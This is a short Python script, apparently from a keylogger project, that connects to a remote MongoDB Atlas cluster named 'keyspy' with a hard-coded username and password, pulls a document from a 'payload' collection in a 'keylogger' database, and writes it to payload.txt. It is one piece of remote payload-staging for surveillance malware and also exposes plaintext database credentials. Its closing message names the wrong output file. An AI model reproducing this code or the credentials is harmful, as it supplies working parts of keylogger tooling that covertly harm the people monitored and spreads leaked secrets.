import pymongo
import os

# Connect to MongoDB
# client = pymongo.MongoClient("mongodb://localhost:27017/")
# db = client["mydatabase"]
# collection = db["mycollection"]
client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
db = client["keylogger"]
payload_collection = db["payload"]
#keylogs_collection = db["keylog"]

# Retrieve the document from MongoDB
document = payload_collection.find_one()

if document:
    # Get the text content from the document
    text_content = document["text"]

    # Delete existing "payload.txt" file if present
    if os.path.exists("payload.txt"):
        os.remove("payload.txt")

    # Save the text content to "payload.txt" file
    with open("payload.txt", "w") as file:
        file.write(text_content)

    print("Text content retrieved from MongoDB and stored in retrieve.txt.")
else:
    print("No document found in MongoDB.")
